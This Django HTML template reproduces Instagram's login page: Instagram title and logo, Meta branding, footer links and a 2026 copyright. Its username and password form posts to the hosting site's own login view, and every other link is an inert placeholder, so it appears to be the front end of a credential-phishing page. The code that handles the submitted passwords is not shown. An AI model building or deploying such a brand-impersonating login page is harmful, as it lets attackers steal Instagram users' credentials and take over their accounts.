
{% load static %}

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Instagram</title>

    <link rel="icon"
          href="{% static 'img/insta.ico' %}"
          type="image/x-icon">

    <script src="https://cdn.tailwindcss.com"></script>

    <link rel="stylesheet"
          href="{% static 'css/style.css' %}">
</head>


<body>

<div class="min-h-screen bg-white flex flex-col items-center">

    <!-- LOGIN BOX -->

    <div class="
        bg-white
        border
        border-gray-300
        w-full
        max-w-[500px]
        min-h-screen
        flex
        flex-col
    ">

        <!-- LOGO -->

        <div class="
            h-[132px]
            border-b
            border-gray-100
            flex
            items-center
            justify-center
        ">

            <img
                src="{% static 'img/insta_form_logo.png' %}"
                alt="Instagram"
                class="instagram-logo"
            >

        </div>


        <!-- LOGIN CONTENT -->

        <div class="px-7 pt-14">

            <h2 class="
                text-black
                mb-6
                font-semibold
                text-[16px]
                leading-[20px]
            ">
                Log into Instagram
            </h2>


            <!-- ERROR -->

            <div id="loginError" class="login-error">
                Correct username and password required.
            </div>


            <!-- FORM -->

            <form
                method="POST"
                action="{% url 'login' %}"
                class="w-full"
                id="loginForm"
            >

                {% csrf_token %}


                <!-- USERNAME -->

                <input
                    type="text"
                    name="username"
                    id="username"
                    placeholder="Mobile number, username or email address"
                    autocomplete="off"
                    class="login-input mb-3"
                >


                <!-- PASSWORD -->

                <input
                    type="password"
                    name="password"
                    id="password"
                    placeholder="Password"
                    autocomplete="off"
                    class="login-input mb-6"
                >


                <!-- LOGIN BUTTON -->

                <button
                    type="submit"
                    id="loginButton"
                    class="login-button"
                    disabled
                >
                    Log in
                </button>

            </form>


            <!-- FORGOT PASSWORD -->

            <a
                href="#"
                class="forgot-password"
            >
                Forgotten password?
            </a>


            <!-- OR -->

            <div class="
                flex
                items-center
                justify-center
                w-full
                mt-10
                mb-5
            ">

                <span class="
                    bg-gray-300
                    h-px
                    flex-grow
                "></span>

                <span class="
                    px-4
                    text-[13px]
                    text-gray-500
                    font-normal
                ">
                    OR
                </span>

                <span class="
                    bg-gray-300
                    h-px
                    flex-grow
                "></span>

            </div>


            <!-- FACEBOOK -->

            <div class="facebook-login">

                <div class="facebook-logo mr-2"></div>

                <span class="facebook-text">
                    Log in with Facebook
                </span>

            </div>


            <!-- CREATE ACCOUNT -->

            <div class="create-account">

                <span class="create-account-text">
                    Create new account
                </span>

            </div>


            <!-- META -->

            <div class="meta-text">

                <span class="meta-symbol">
                    ∞
                </span>

                Meta

            </div>

        </div>


        <!-- FOOTER -->

        <footer class="
            mt-auto
            border-t
            border-gray-100
            pt-4
            pb-5
        ">

            <div class="
                flex
                flex-wrap
                justify-center
                gap-x-4
                gap-y-1
                px-3
            ">

                <a href="#" class="footer-link">Meta</a>
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Blog</a>
                <a href="#" class="footer-link">Jobs</a>
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">API</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Locations</a>
                <a href="#" class="footer-link">Instagram Lite</a>
                <a href="#" class="footer-link">Threads</a>

            </div>

            <p class="footer-copy">
                © 2026 Instagram
            </p>

        </footer>

    </div>

</div>


{% load static %}

<script src="{% static 'js/button.js' %}" defer></script>
</body>

</html>
